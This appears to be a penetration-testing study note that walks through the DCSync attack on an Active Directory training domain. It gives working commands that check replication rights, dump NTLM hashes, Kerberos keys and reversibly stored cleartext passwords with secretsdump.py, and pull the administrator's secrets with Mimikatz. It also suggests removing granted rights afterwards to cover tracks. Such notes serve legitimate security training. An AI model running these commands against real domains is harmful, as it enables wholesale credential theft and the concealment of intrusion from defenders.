Technique for stealing Active Directory password database by using the built-in Directory Replication Service Remote Protocol.
Extended right needed: DS-Replication-Get-Changes-All

**Tools:
- Mimikatz
- Invoke-DCSync
- secretsdump.py (decrypts any passwords stored using reversible encryption)

**Using Get-DomainUser to View adunn's Group Membership
```
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

**Using Get-ObjectAcl to Check adunn's Replication Rights
```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
- If we have WriteDacl rights over the user, then we can add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

**Extacting NTLM Hashes and Kerberos Keys Using secretsdump.py
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
- '-just-dc' tells tool to extract NTLM hashes and Kerberos keys from the NTDS file.
- '-just-dc-ntlm' will only extract NTLM hashes
- '-just-dc-user <username> only extracts data from a specific user
- '-pwd-last-set'
- '-history' to dump password history (domain password strength metrics)
- '-user-status' to check if user is disabled. We can filter out disabled users to provide client with password cracking statistics like % of passwords cracked, top 10 passwords, password length metrics, password re-use.

**Listing Hashes, Kerberos Keys, and Cleartext Passwords
```
ls inlanefreight_hashes*
```
- Cleartext passwords can be seen due to 'store password using reversible encryption' account option set.

**Enumerating Further using Get-ADUser
```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
- Reversible encryption enabled

**Checking for Reversible Encryption Option using Get-DomainUser
```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

**Displaying the Decrypted Password
```
cat inlanefreight_hashes.ntds.cleartext
```

## Mimikatz

**Using runas.exe
```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

**Performing the Attack with Mimikatz
```
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
